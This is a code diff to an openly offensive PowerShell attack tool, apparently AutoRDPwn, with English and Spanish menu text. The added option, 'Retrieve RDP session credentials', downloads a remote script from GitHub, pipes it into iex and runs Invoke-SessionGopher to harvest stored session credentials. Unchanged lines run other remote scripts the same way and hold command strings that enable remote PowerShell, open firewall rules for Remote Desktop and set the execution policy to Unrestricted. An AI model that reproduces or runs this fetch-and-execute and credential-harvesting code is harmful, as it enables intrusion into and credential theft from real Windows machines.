@@ -80,7 +80,7 @@ if($Language -in 'English') {
   $txt2  = "Close the program"
   $txt3  = "Your version of Powershell is not compatible with this script :("
   $txt4  = "You can download the latest version here"
-  $txt5  = "Your operating system is not compatible with this attack, choose another one"
+  $txt5  = "Your operating system is not compatible with this attack"
   $txt6  = "Incorrect option, try again"
   $txt7  = "Choose how you want to launch the attack:` "
   $txt8  = "Choose the module you want to load:` "
@@ -136,6 +136,7 @@ if($Language -in 'English') {
   $txt58 = "All User Profile"
   $txt59 = "Recover Wi-Fi passwords"
   $txt60 = "There is no wireless network on this computer"
+  $txt61 = "Retrieve RDP session credentials"
   $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet *' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi *' -NetworkCategory Private; winrm quickconfig -quiet; Enable-PSRemoting -Force"
   $Pwn2  = "netsh advfirewall firewall set rule group = 'Remote Assistance' new enable = Yes; netsh advfirewall firewall set rule group='Remote Desktop' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
   $Pwn3  = "netsh advfirewall firewall set rule group = 'Network Discovery' new enable = Yes; netsh advfirewall firewall set rule group = 'Remote Scheduled Tasks Management' new enable = yes"
@@ -148,7 +149,7 @@ if($Language -in 'Spanish') {
   $txt2  = "Cerrar el programa"
   $txt3  = "Tu versión de Powershell no es compatible con este script :("
   $txt4  = "Puedes descargar la última versión aquí"
-  $txt5  = "Tu sistema operativo no es compatible con este ataque, elige otro"
+  $txt5  = "Tu sistema operativo no es compatible con este ataque"
   $txt6  = "Opción incorrecta, vuelve a intentarlo de nuevo"
   $txt7  = "Elige cómo quieres lanzar el ataque:` "
   $txt8  = "Elige el módulo que quieres cargar:` "
@@ -204,6 +205,7 @@ if($Language -in 'Spanish') {
   $txt58 = "Perfil de todos los usuarios"
   $txt59 = "Recuperar contraseñas Wi-Fi"
   $txt60 = "No existe ninguna red inalámbrica en este equipo"
+  $txt61 = "Recuperar credenciales de sesión RDP"
   $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force"
   $Pwn2  = "netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes ; netsh advfirewall firewall set rule group='Escritorio Remoto' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
   $Pwn3  = "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes"
@@ -418,6 +420,7 @@ if($Language -in 'Spanish') {
         if($module -like '4') { Show-Banner
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt11" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt12" -ForegroundColor Gray
+	Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt61" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
         Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
@@ -430,9 +433,13 @@ if($Language -in 'Spanish') {
         if($forensics -like '2') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
         Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/ListAllUsers.ps1 -UseBasicParsing | iex
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; sleep -milliseconds 2500 }
+	
+	if($forensics -like '3') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
+        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/SessionGopher.ps1 -UseBasicParsing | iex
+        Invoke-SessionGopher -Thorough ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; sleep -milliseconds 2500 }
 
         if($forensics -like 'X'){ $input = 'x' ; continue }
-        if($forensics -in '1','2','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
+        if($forensics -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
         
 	if($module -like '5') { $stickykeys ="true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }
 
